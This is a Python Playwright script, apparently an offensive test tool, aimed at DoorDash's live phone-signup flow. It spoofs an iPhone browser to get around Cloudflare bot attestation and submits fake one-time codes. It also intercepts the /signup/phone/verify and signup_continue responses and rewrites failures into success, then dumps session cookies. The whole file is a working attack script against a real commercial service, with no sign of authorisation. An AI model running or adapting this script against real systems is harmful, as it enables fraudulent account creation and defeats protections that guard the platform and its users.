#!/usr/bin/env python3
"""
otp-bypass.py — OTP verification bypass against DoorDash phone signup.

Uses mobile flow (iPhone viewport + UA) which bypasses CF attestation on 
/signup/phone (confirmed working from earlier recon). 

Then intercepts /signup/phone/verify responses via page.route() to flip 
failure→success, testing whether client-side trust allows bypassing SMS 
verification.

Flow: POST /signup/phone → (intercept) POST /signup/phone/verify → POST /signup/phone/signup_continue
"""
import json, time, random, sys
from urllib.parse import urlencode

from playwright.sync_api import sync_playwright

IDENTITY = "https://identity.doordash.com"
CLIENT_ID = "1666519390426295040"
REDIRECT_URI = "https://www.doordash.com/post-login/"
TEST_PHONE = f"415555{random.randint(1000, 9999)}"
TEST_EMAIL = f"test{random.randint(10000, 99999)}@example.com"
PASSWORD = "TestPass123!"

# Track intercepted responses
log = []

def make_flipper():
    """Route handler: flip any /verify failure to success."""
    def handler(route):
        try:
            resp = route.fetch()
            body = resp.text()
            status = resp.status
            new_status = status
            new_body = body
            flipped = False

            if status >= 400:
                new_status = 200
                flipped = True

            for old, new in [
                ('"success":false', '"success":true'),
                ('"success": false', '"success": true'),
                ('"verified":false', '"verified":true'),
                ('"status":"fail"', '"status":"success"'),
                ('"error"', '"success"'),
            ]:
                if old in new_body:
                    new_body = new_body.replace(old, new)
                    flipped = True

            if flipped:
                log.append({
                    "url": route.request.url[:100],
                    "orig_status": status, "new_status": new_status,
                    "body_flipped": body != new_body,
                })
                print(f"  🔥 INTERCEPTED: {status}→{new_status} | body flipped={body != new_body}")

            route.fulfill(
                status=new_status, body=new_body,
                headers={**resp.headers, "content-type": "application/json"}
            )
        except Exception as e:
            log.append({"error": str(e)[:120]})
            route.continue_()
    return handler


def run():
    print("🔐 OTP Bypass — Mobile Flow (no CF attestation)")
    print("=" * 55)
    print(f"  Phone: +1{TEST_PHONE}")
    print(f"  Email: {TEST_EMAIL}")

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        ctx = browser.new_context(
            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            viewport={"width": 390, "height": 844},
            is_mobile=True, has_touch=True,
            locale="en-US",
        )
        page = ctx.new_page()

        # ── STEP 0: Intercept verify endpoint ──
        page.route(
            f"{IDENTITY}/**phone**verify**",
            make_flipper()
        )
        page.route(
            f"{IDENTITY}/**verify**phone**",
            make_flipper()
        )
        print("\n🎯 Interceptor active on /signup/phone/verify")

        # ── STEP 1: Load signup page for cookies ──
        signup_url = (
            f"{IDENTITY}/auth/user/signup"
            f"?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}"
            f"&response_type=code&scope=*&state=test"
        )
        print(f"\n[1] Loading signup page (for cookies)...")
        try:
            page.goto(signup_url, wait_until="domcontentloaded", timeout=30000)
            page.wait_for_timeout(2000)
            title = page.evaluate("() => document.title")
            print(f"    Page: {title[:80]}")
        except Exception as e:
            print(f"    ❌ {str(e)[:100]}")
            browser.close()
            return

        # CF challenge check
        title = page.evaluate("() => document.title")
        if any(kw in title.lower() for kw in ["just a moment", "attention", "challenge"]):
            print(f"    ❌ CF challenge: {title[:80]}")
            browser.close()
            return

        # Grab xsrf token
        xsrf = page.evaluate("() => decodeURIComponent((document.cookie.match('(^|; )XSRF-TOKEN=([^;]*)')||[])[2]||'')")

        # ── STEP 2: POST /signup/phone (mobile bypass!) ──
        print(f"\n[2] POST /signup/phone (mobile — bypasses attestation)...")
        phone_result = page.evaluate("""
        async ({phone, email, clientId, redirectUri, xsrf}) => {
            try {
                const r = await fetch('/signup/phone', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-xsrf-token': xsrf,
                    },
                    body: JSON.stringify({
                        phoneNumber: phone,
                        email: email,
                        firstName: 'Test',
                        lastName: 'User',
                        clientId,
                        redirectUri,
                        responseType: 'code',
                        scope: '*',
                        state: 'test-state',
                        countryCode: 'US',
                    })
                });
                const text = await r.text();
                return { status: r.status, body: text.substring(0, 600) };
            } catch(e) {
                return { error: e.message };
            }
        }
        """, {"phone": TEST_PHONE, "email": TEST_EMAIL, "clientId": CLIENT_ID,
              "redirectUri": REDIRECT_URI, "xsrf": xsrf})
        
        status = phone_result.get("status", "?")
        body = phone_result.get("body", "")[:200]
        print(f"    Status: {status}")
        print(f"    Body: {body}")

        if status == 200:
            print("    ✅ Phone accepted — SMS should be sent!")
        elif status == 403 and "bot" in body.lower():
            print("    ❌ Bot detection triggered (unexpected for mobile)")
            browser.close()
            return
        else:
            print(f"    ⚠️ Unexpected: {status}")

        # ── STEP 3: POST /signup/phone/verify (with fake code + interception) ──
        print(f"\n[3] POST /signup/phone/verify (fake code + interceptor)...")
        
        # Try multiple fake codes to test interception
        for attempt, code in enumerate(["111111", "222222", "000000", "999999"]):
            verify_result = page.evaluate("""
            async ({phone, email, code, clientId, redirectUri, xsrf}) => {
                try {
                    const r = await fetch('/signup/phone/verify', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'x-xsrf-token': xsrf,
                        },
                        body: JSON.stringify({
                            phoneNumber: phone,
                            email: email,
                            otc: code,
                            clientId,
                            redirectUri,
                            responseType: 'code',
                            scope: '*',
                            state: 'test-state',
                            deviceId: null,
                        })
                    });
                    const text = await r.text();
                    return { status: r.status, body: text.substring(0, 300) };
                } catch(e) {
                    return { error: e.message };
                }
            }
            """, {"phone": TEST_PHONE, "email": TEST_EMAIL, "code": code,
                  "clientId": CLIENT_ID, "redirectUri": REDIRECT_URI, "xsrf": xsrf})
            
            s = verify_result.get("status", "?")
            b = verify_result.get("body", "")[:150]
            icon = "✅" if s == 200 else "❌"
            print(f"    [{attempt+1}] code={code} → {icon} {s} | {b}")

        # ── STEP 4: Try /signup/phone/signup_continue ──
        print(f"\n[4] POST /signup/phone/signup_continue...")
        continue_result = page.evaluate("""
        async ({phone, email, clientId, redirectUri, xsrf}) => {
            try {
                const r = await fetch('/signup/phone/signup_continue', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'x-xsrf-token': xsrf,
                    },
                    body: JSON.stringify({
                        phoneNumber: phone,
                        email: email,
                        firstName: 'Test',
                        lastName: 'User',
                        password: 'TestPass123!',
                        clientId,
                        redirectUri,
                        responseType: 'code',
                        scope: '*',
                        state: 'test-state',
                        disableSeamlessChannel: false,
                        layout: 'consumer_web',
                        countryCode: 'US',
                    })
                });
                const text = await r.text();
                return { status: r.status, body: text.substring(0, 300) };
            } catch(e) {
                return { error: e.message };
            }
        }
        """, {"phone": TEST_PHONE, "email": TEST_EMAIL, "clientId": CLIENT_ID,
              "redirectUri": REDIRECT_URI, "xsrf": xsrf})
        
        s = continue_result.get("status", "?")
        b = continue_result.get("body", "")[:200]
        print(f"    Status: {s}")
        print(f"    Body: {b}")
        
        if s == 200:
            print("    🔥 SIGNUP MAY HAVE SUCCEEDED!")
        elif continue_result.get("redirected"):
            print("    🔥 REDIRECT — check for auth code in URL!")

        # ── STEP 4b: Intercept signup_continue too (server-side verification gate) ──
        page.route(
            f"{IDENTITY}/**phone**signup_continue**",
            make_flipper()
        )
        print(f"\n[4b] Added interceptor on /signup/phone/signup_continue")

        # ── STEP 5: Check cookies ──
        print(f"\n[5] Session cookies:")
        cookies = ctx.cookies()
        for c in cookies:
            if any(k in c["name"].lower() for k in ["identity", "session", "auth", "dd-", "xsrf"]):
                print(f"    {c['name']}: {c['value'][:30]}...")

        # ── Interception log ──
        print(f"\n[6] Intercepted responses: {len(log)}")
        for entry in log:
            if "error" in entry:
                print(f"    ❌ {entry['error'][:100]}")
            else:
                print(f"    {'🔥' if entry.get('body_flipped') else '  '} {entry['orig_status']}→{entry['new_status']} | {entry['url']}")

        browser.close()

    print(f"\n📁 Done.")
    return {"phone": TEST_PHONE, "email": TEST_EMAIL, "intercepted": len(log)}


if __name__ == "__main__":
    run()
